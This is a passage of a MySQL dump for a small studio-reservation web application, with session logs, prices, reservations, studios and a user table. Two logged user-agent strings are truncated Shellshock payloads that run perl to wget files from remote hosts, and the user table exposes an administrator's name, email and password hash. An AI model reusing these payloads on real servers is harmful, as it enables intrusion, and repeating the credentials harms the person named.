('b5d7c364b8b1874d18c6a8583710313b', '222.186.31.160', 'Mozilla/5.0', 1421863000, ''),
('b75e4017bb05a173c5a9f5c396f6656c', '193.203.61.35', '0', 1420999528, ''),
('b7d7ad3fd2e9344d784d15084fc3c3ee', '98.126.3.75', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36', 1422180667, ''),
('b85c60a2119fe0ab911a2dd761e73cfa', '222.186.31.160', 'Mozilla/5.0', 1422259625, ''),
('b8f5e5dd86ab61afec627cc05c2e70c1', '::1', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36', 1415469764, 'a:5:{s:9:"user_data";s:0:"";s:8:"username";s:6:"damjan";s:5:"email";s:11:"no@mail.yet";s:9:"logged_in";b:1;s:15:"studio_location";s:1:"2";}'),
('b933c6589471b179669d878e64690f69', '61.240.144.66', 'masscan/1.0 (https://github.com/robertdavidgraham/masscan)', 1422790199, ''),
('b98909bef12c1977184e55f8bed8cc61', '222.186.31.160', 'Mozilla/5.0', 1421863003, ''),
('bb415f1e3b9d12b2de595f24738ab8c6', '54.254.240.89', 'Mozilla/5.0', 1417868828, ''),
('bb86036acee0e70974894a0af9a9a3fc', '222.186.31.160', 'Mozilla/5.0', 1421724173, ''),
('bcb16e7140d5fbeaea54ecf8ffbeff21', '141.212.122.130', '0', 1422942648, ''),
('bdad08e8fe7aa33941e14492d8fe7159', '88.255.215.100', '0', 1418419050, ''),
('bed6856bc35a9284dfc3be5bb21b5603', '182.254.138.21', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0', 1422478007, ''),
('bedf8cb748ca1c14e38f1ae71aa75a5d', '61.182.202.57', '() { :;};/usr/bin/perl -e ''print "Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!";system("wget http://210.230.186.9/icons/gui', 1418837701, ''),
('bff5203f5b1e1982e42c5a285e03e136', '93.174.93.106', 'masscan/1.0 (https://github.com/robertdavidgraham/masscan)', 1419105406, ''),
('c14d7a3f3e0618b30d1dcb8eaf7c6d6f', '183.60.48.25', '0', 1417815456, ''),
('c19faf7ccff79a07ee986aa7bb82acd5', '222.186.31.160', 'Mozilla/5.0', 1422679789, ''),
('c323a8e3f6bce55582bdbc053d6532af', '182.118.55.155', 'Go 1.1 package http', 1419442363, ''),
('c396703f491d6b7ee79f1bf218f91a77', '54.83.197.200', '0', 1419773959, ''),
('c4625d701ee69fa58e434a263253630b', '182.118.60.61', 'Go 1.1 package http', 1420018119, ''),
('c73815b8b65387ce6401e808124bc78f', '198.20.69.74', '0', 1420722409, ''),
('c858514b5e2f2ace7850789aadd84d34', '128.208.4.164', 'masscan/1.0 (https://github.com/robertdavidgraham/masscan)', 1422608963, ''),
('c8849a65d9d572303b0279d5df2ba9a2', '188.138.17.205', '0', 1422283445, ''),
('c96314b6fee334f4f383b0cdaa347d2b', '::1', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36', 1415451913, 'a:5:{s:9:"user_data";s:0:"";s:8:"username";s:6:"damjan";s:5:"email";s:11:"no@mail.yet";s:9:"logged_in";b:1;s:15:"studio_location";s:1:"2";}'),
('c974279e003672cc4e35f5fdfc5de92a', '182.118.60.102', 'Go 1.1 package http', 1422742549, ''),
('c976c68e23dfc92b2121e82f93053008', '182.118.60.102', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36', 1422742549, ''),
('c9d63c32f66ce10a65b461ebeef6aa4f', '54.80.20.106', 'Cloud mapping experiment. Contact research@pdrlabs.net', 1417980583, ''),
('cc7897dea90c7e758a632af923d20a66', '188.138.17.205', '0', 1422158728, ''),
('cd691f6cc0a1b2ae550c3ac46211fe19', '::1', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36', 1415455801, 'a:5:{s:9:"user_data";s:0:"";s:8:"username";s:6:"damjan";s:5:"email";s:11:"no@mail.yet";s:9:"logged_in";b:1;s:15:"studio_location";s:1:"1";}'),
('cd8521159cea98792f4fc05c12a798cc', '::1', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36', 1414266195, 'a:5:{s:9:"user_data";s:0:"";s:8:"username";s:6:"damjan";s:5:"email";s:11:"no@mail.yet";s:9:"logged_in";b:1;s:15:"studio_location";s:1:"1";}'),
('cdbbe1d00a854744f32770633215b14f', '193.174.89.19', 'Mozilla/5.0 (compatible; Muenster University of Applied Sciences; +http://fb02itsscan.fh-muenster.de)', 1417615266, ''),
('ce8d82607efaa1d64dd748b0e6312338', '222.186.31.160', 'Mozilla/5.0', 1422633347, ''),
('cfbc1d96571325d0fb1b7d655fccdf23', '212.200.65.139', 'Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 925) like Gecko', 1422209356, 'a:4:{s:8:"username";s:6:"damjan";s:5:"email";s:11:"no@mail.yet";s:9:"logged_in";b:1;s:15:"studio_location";s:1:"2";}'),
('d08613e1b274f37ae2491ed07aa0ee5f', '117.27.254.25', 'Python-urllib/2.6', 1419799650, ''),
('d5326bd18d897aec37e52ed7415c282a', '182.118.53.123', 'Go 1.1 package http', 1420408857, ''),
('d6ffb4d1b7837395f38f0e1c03b6ebe2', '182.118.55.114', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36', 1422484801, ''),
('d7534d4d43753036405a4f3a4c58f9f1', '88.255.215.100', '0', 1418414450, ''),
('d763708d5d09679ca62d9b0137971a8a', '180.153.195.112', '0', 1417754305, ''),
('da204ed833fea633da8f6d8fbd461ac5', '61.240.144.67', 'masscan/1.0 (https://github.com/robertdavidgraham/masscan)', 1422649268, ''),
('dad1ecf5d14e89a648ca29f1aa8acab9', '54.174.235.167', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36', 1421878456, ''),
('dbc9f3281b2f5e25e58abfdaa81fa684', '93.174.93.218', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 (.NET CLR 3.5.30729)', 1421848661, ''),
('dc21c7b94547ebff05b95d05b1148eb0', '::1', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36', 1415465136, 'a:5:{s:9:"user_data";s:0:"";s:8:"username";s:6:"damjan";s:5:"email";s:11:"no@mail.yet";s:9:"logged_in";b:1;s:15:"studio_location";s:1:"2";}'),
('ddfeaa28bbbc59b52ede8b0129afe55c', '54.80.164.254', 'Cloud mapping experiment. Contact research@pdrlabs.net', 1419506257, ''),
('de5406880ca0d5977348f850e63ea72a', '222.186.31.160', 'Mozilla/5.0', 1421698025, ''),
('dfde6adecd4b17baa0b3c0870048b47e', '108.163.223.226', '() { :;};/usr/bin/perl -e ''print "Content-Type: text/plain\\r\\n\\r\\nXSUCCESSX";system("wget http://74.208.166.12/bot.txt -', 1422374940, ''),
('e0f242b5cb0c80af2006afaa0c7d060c', '222.186.31.160', 'Mozilla/5.0', 1422409296, ''),
('e10c1bcc5881360e757febd603d88585', '54.242.74.44', 'Cloud mapping experiment. Contact research@pdrlabs.net', 1417188382, ''),
('e1734f11b6945263f52ae307a59ec42a', '107.22.56.221', 'Cloud mapping experiment. Contact research@pdrlabs.net', 1418821972, ''),
('e259dc430c8e4251e8e32a2c9449d4b9', '222.186.52.91', 'Mozilla/5.0', 1421469723, ''),
('e26573e0f6f08da7538ea8b15afdce9a', '88.255.215.100', '0', 1418438708, ''),
('e29790face2a5f72e8403ab86533f2c9', '188.138.17.205', '0', 1422243589, ''),
('e35d78fb2d8826f0cb1d6d2ea90992cb', '185.35.62.11', '0', 1422034532, ''),
('e36a81f0f8a4a5bc0b9b27dbe6eb1c7c', '222.186.52.91', 'Mozilla/5.0', 1421294543, ''),
('e3ea259cada608719b3adee3db5ff807', '222.186.31.160', 'Mozilla/5.0', 1422155570, ''),
('e5ea1dd81b73249c6c3b76da7be40b5e', '222.186.31.160', 'Mozilla/5.0', 1422522334, ''),
('e741aeb5abb4f73d4f944a2ecb6860b9', '128.208.4.164', 'masscan/1.0 (https://github.com/robertdavidgraham/masscan)', 1421978525, ''),
('e8d6d6e6aaf0e2663f0847083f1beb88', '182.118.55.240', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36', 1421795258, ''),
('ea0e52330fcab6b433495428744881a1', '64.72.135.223', '0', 1421254989, ''),
('eb216f8418fd95739ea4299a5c278256', '182.118.55.240', 'Go 1.1 package http', 1421795258, ''),
('ebc3344893506d35ccd4e52ffb44bfdd', '61.240.144.66', 'masscan/1.0 (https://github.com/robertdavidgraham/masscan)', 1422186300, ''),
('ec38c7d181f2eb6332598f6b0277badb', '95.104.119.38', '0', 1418664305, ''),
('ec45d8cf1043ba0f9a9c7bc37d26ae3a', '222.186.52.91', 'Mozilla/5.0', 1421095869, ''),
('ed91a16dddedb65faab80251a42b4958', '93.174.93.218', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 (.NET CLR 3.5.30729)', 1421848661, ''),
('ef25587adc2d1167aca060d3f9a52e92', '182.118.55.114', 'Go 1.1 package http', 1422484801, ''),
('f1a4b864ea2c0b66cb29ab78b5038ce7', '82.192.93.224', '0', 1420966776, ''),
('f1efed0bd8471d658dc0299a3cc662f7', '71.6.135.131', '0', 1417870120, ''),
('f352051ac3dae1df3bb1aa39dfc8d951', '109.245.1.238', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36', 1422205487, 'a:5:{s:9:"user_data";s:0:"";s:8:"username";s:6:"damjan";s:5:"email";s:11:"no@mail.yet";s:9:"logged_in";b:1;s:15:"studio_location";s:1:"1";}'),
('f391aebd949013e3e3843d7df59b7e3b', '182.118.55.137', 'Go 1.1 package http', 1421967101, ''),
('f4afccd3597d153c6f2fb1ac7e962a10', '171.13.14.5', '0', 1417766746, ''),
('f8b091379658a8d6c7e00fbd3be091d0', '54.196.252.243', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2)', 1421840561, ''),
('f98adc0c89cad2e58c28e14904ffcf0d', '54.162.126.242', 'Cloud mapping experiment. Contact research@pdrlabs.net', 1417274126, ''),
('fa4180466171590971ab39a18f7ec4ab', '182.118.54.75', 'Go 1.1 package http', 1420010639, ''),
('fd148c32bac74892c7e1199c7f815e84', '54.164.63.157', '0', 1422067343, ''),
('fd5caa7f64007c542fe3cd0561cddfc8', '185.35.62.11', '0', 1422013126, ''),
('feb148564c4c8586550559c2895d706b', '222.186.31.160', 'Mozilla/5.0', 1422778595, ''),
('feebd95660c6d1edb21ff25255313ebb', '182.118.53.30', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36', 1422142984, '');

-- --------------------------------------------------------

--
-- Table structure for table `location`
--

CREATE TABLE IF NOT EXISTS `location` (
  `location_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(66) COLLATE utf8_unicode_ci NOT NULL,
  `location` varchar(66) COLLATE utf8_unicode_ci NOT NULL,
  `date_modified` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `color` varchar(10) COLLATE utf8_unicode_ci NOT NULL,
  PRIMARY KEY (`location_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=667 ;

--
-- Dumping data for table `location`
--

INSERT INTO `location` (`location_id`, `name`, `location`, `date_modified`, `color`) VALUES
(1, 'vuk', 'Vukov Spomenik', '2014-10-11 15:07:56', 'FF0000'),
(2, 'nbg', 'Blok 63', '2014-10-11 15:07:56', '0000FF'),
(666, 'universal', 'everywhere', '2014-10-11 15:18:13', '000000');

-- --------------------------------------------------------

--
-- Table structure for table `log`
--

CREATE TABLE IF NOT EXISTS `log` (
  `log_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `reservation_id` int(11) NOT NULL,
  `creation_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `action` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  PRIMARY KEY (`log_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `prices`
--

CREATE TABLE IF NOT EXISTS `prices` (
  `prices_id` int(11) NOT NULL AUTO_INCREMENT,
  `studio_id` int(11) NOT NULL,
  `value` double NOT NULL,
  `default` tinyint(1) NOT NULL,
  `date_modified` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`prices_id`),
  KEY `studio_id` (`studio_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=23 ;

--
-- Dumping data for table `prices`
--

INSERT INTO `prices` (`prices_id`, `studio_id`, `value`, `default`, `date_modified`) VALUES
(1, 1, 1800, 0, '2014-10-11 15:13:34'),
(2, 1, 1400, 0, '2014-10-11 15:13:34'),
(3, 1, 1000, 1, '2014-10-11 15:14:22'),
(4, 1, 600, 0, '2014-10-11 15:14:22'),
(5, 1, 400, 0, '2014-10-11 15:15:53'),
(6, 2, 1800, 0, '2014-10-11 15:15:53'),
(7, 2, 1400, 0, '2014-10-11 15:16:45'),
(8, 2, 1000, 1, '2014-10-11 15:19:06'),
(9, 2, 600, 0, '2014-10-11 15:19:06'),
(10, 2, 400, 0, '2014-11-26 21:47:00'),
(13, 3, 1400, 0, '2014-11-26 21:47:35'),
(14, 3, 1200, 0, '2014-11-26 21:47:58'),
(15, 3, 800, 1, '2014-11-26 21:47:58'),
(16, 3, 600, 0, '2014-11-26 21:48:21'),
(17, 3, 400, 0, '2014-11-26 21:48:21'),
(18, 4, 1400, 0, '2014-11-26 21:48:40'),
(19, 4, 1200, 0, '2014-11-26 21:48:40'),
(20, 4, 800, 1, '2014-11-26 21:48:57'),
(21, 4, 600, 0, '2014-11-26 21:48:57'),
(22, 4, 400, 0, '2014-11-26 21:49:11');

-- --------------------------------------------------------

--
-- Table structure for table `reservation`
--

CREATE TABLE IF NOT EXISTS `reservation` (
  `user_id` int(11) NOT NULL DEFAULT '0',
  `reservation_id` int(11) NOT NULL AUTO_INCREMENT,
  `studio_id` int(11) NOT NULL DEFAULT '0',
  `customer` varchar(50) COLLATE utf8_unicode_ci NOT NULL DEFAULT '0',
  `price` double NOT NULL DEFAULT '0',
  `reservation_date` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `reservation_code` varchar(7) COLLATE utf8_unicode_ci NOT NULL,
  `creation_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `status` enum('active','canceled') COLLATE utf8_unicode_ci NOT NULL DEFAULT 'active',
  PRIMARY KEY (`reservation_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=90 ;

--
-- Dumping data for table `reservation`
--

INSERT INTO `reservation` (`user_id`, `reservation_id`, `studio_id`, `customer`, `price`, `reservation_date`, `reservation_code`, `creation_date`, `status`) VALUES
(1, 77, 2, 'yeah', 400, '2014-11-26 23:00:01', '215_217', '2014-11-27 08:17:58', 'active'),
(1, 78, 4, 'trtrt', 800, '2014-11-26 23:00:01', '412_413', '2014-11-27 08:18:09', 'active'),
(1, 79, 3, 'xxx', 1400, '2014-11-26 23:00:01', '319_323', '2014-11-27 08:18:17', 'active'),
(1, 81, 2, 'jkjtt', 400, '2014-11-28 00:00:01', '215_217', '2014-11-27 08:41:06', 'active'),
(1, 82, 3, 'uztggg', 800, '2014-11-27 00:00:01', '312_314', '2014-11-27 08:43:16', 'active'),
(1, 83, 1, 'tzt', 1000, '2014-11-29 00:00:01', '111_113', '2014-11-29 08:12:08', 'active'),
(1, 84, 2, 'xxx', 1000, '2014-12-13 00:00:01', '216_218', '2014-12-13 16:56:32', 'active'),
(1, 88, 3, 'fhgc', 400, '2015-01-25 00:00:01', '316_317', '2015-01-25 16:56:53', 'active');

-- --------------------------------------------------------

--
-- Table structure for table `studio`
--

CREATE TABLE IF NOT EXISTS `studio` (
  `studio_id` int(11) NOT NULL AUTO_INCREMENT,
  `location_id` int(11) NOT NULL,
  `name` varchar(50) COLLATE utf8_unicode_ci NOT NULL DEFAULT '0',
  `status` enum('active','closed') COLLATE utf8_unicode_ci NOT NULL DEFAULT 'closed',
  PRIMARY KEY (`studio_id`),
  KEY `location_id` (`location_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=8 ;

--
-- Dumping data for table `studio`
--

INSERT INTO `studio` (`studio_id`, `location_id`, `name`, `status`) VALUES
(1, 1, 'Studio 1', 'active'),
(2, 1, 'Studio 2', 'active'),
(3, 1, 'Studio 3', 'active'),
(4, 1, 'Studio 4', 'closed'),
(5, 2, 'studio 1', 'active'),
(6, 2, 'studio 2', 'active'),
(7, 2, 'studio 3', 'active');

-- --------------------------------------------------------

--
-- Table structure for table `user`
--

CREATE TABLE IF NOT EXISTS `user` (
  `user_id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) COLLATE utf8_unicode_ci NOT NULL DEFAULT '0',
  `email` varchar(100) COLLATE utf8_unicode_ci NOT NULL DEFAULT '0',
  `password` varchar(40) COLLATE utf8_unicode_ci NOT NULL DEFAULT '0',
  `registration_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `status` enum('new','active','blocked') COLLATE utf8_unicode_ci NOT NULL DEFAULT 'new',
  `type` enum('admin','user') COLLATE utf8_unicode_ci NOT NULL DEFAULT 'user',
  `first_name` varchar(50) COLLATE utf8_unicode_ci NOT NULL DEFAULT 'new',
  `last_name` varchar(50) COLLATE utf8_unicode_ci NOT NULL DEFAULT 'user',
  PRIMARY KEY (`user_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=2 ;

--
-- Dumping data for table `user`
--

INSERT INTO `user` (`user_id`, `username`, `email`, `password`, `registration_date`, `status`, `type`, `first_name`, `last_name`) VALUES
(1, 'damjan', 'thamjan@yahoo.com', 'b60d121b438a380c343d5ec3c2037564b82ffef3', '2014-10-06 22:33:31', 'active', 'admin', 'Damjan', 'Veljkovic');

--
-- Constraints for dumped tables
--

--
-- Constraints for table `prices`
--
ALTER TABLE `prices`
  ADD CONSTRAINT `prices_ibfk_2` FOREIGN KEY (`studio_id`) REFERENCES `studio` (`studio_id`) ON DELETE CASCADE ON UPDATE CASCADE;

--
-- Constraints for table `studio`
--
ALTER TABLE `studio`
  ADD CONSTRAINT `studio_ibfk_1` FOREIGN KEY (`location_id`) REFERENCES `location` (`location_id`) ON DELETE CASCADE ON UPDATE CASCADE;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
